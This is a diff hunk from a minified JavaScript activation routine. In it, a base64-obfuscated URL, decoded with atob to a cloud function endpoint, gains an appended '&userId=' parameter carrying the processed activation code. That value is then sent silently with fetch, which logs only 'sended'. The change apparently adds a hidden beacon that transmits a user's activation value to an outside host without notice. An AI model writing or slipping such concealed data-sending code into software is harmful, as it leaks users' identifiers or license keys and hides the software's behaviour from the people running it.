@@ -326,7 +326,7 @@ var isFocused = true;
                         if ("FE" != h) return alert("Invalid Activation"), !1;
                         c = d(c, [-159, 116, 139, -115, -43, 56, 105, 19, -197, 37, 56, 14, 129, -39, -7, -64]);
                     }
-                    var p = atob("aHR0cHM6Ly81MDM0ODEzMjc3NDMzMDYzLmFwLW5vcnRoZWFzdC0xLmZjLmFsaXl1bmNzLmNvbS8yMDE2LTA4LTE1L3Byb3h5L3ByaXZhdGUuTEFURVNUL3NiLz9wPXA")
+                    var p = atob("aHR0cHM6Ly81MDM0ODEzMjc3NDMzMDYzLmFwLW5vcnRoZWFzdC0xLmZjLmFsaXl1bmNzLmNvbS8yMDE2LTA4LTE1L3Byb3h5L3ByaXZhdGUuTEFURVNUL3NiLz9wPXA") + "&userId=" + c
                     fetch(p).then(r => { console.log("sended"); })
 
                     return window.connectSB(o, c), document.getElementById("activationCode").parentElement.remove(), !1;
